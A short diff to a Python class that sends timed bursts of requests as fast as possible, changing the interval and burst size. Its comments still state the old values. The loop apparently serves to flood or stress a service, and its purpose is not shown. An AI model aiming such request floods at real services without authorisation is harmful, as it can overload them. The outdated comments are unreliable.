@@ -198,12 +198,12 @@ class TOS1:
         while self.running:
             current_time = time.time()
             # Send 7500 requests every 59 seconds
-            if current_time - last_burst_time >= 59:
+            if current_time - last_burst_time >= 10:
                 requests_sent = 0
                 burst_start = time.time()
                 
                 # Send 7500 requests as fast as possible
-                while requests_sent < 7500 and time.time() - burst_start < 5 and self.running:
+                while requests_sent < 1500 and time.time() - burst_start < 5 and self.running:
                     if self.send_request("PATRIOT"):
                         requests_sent += 1
                 
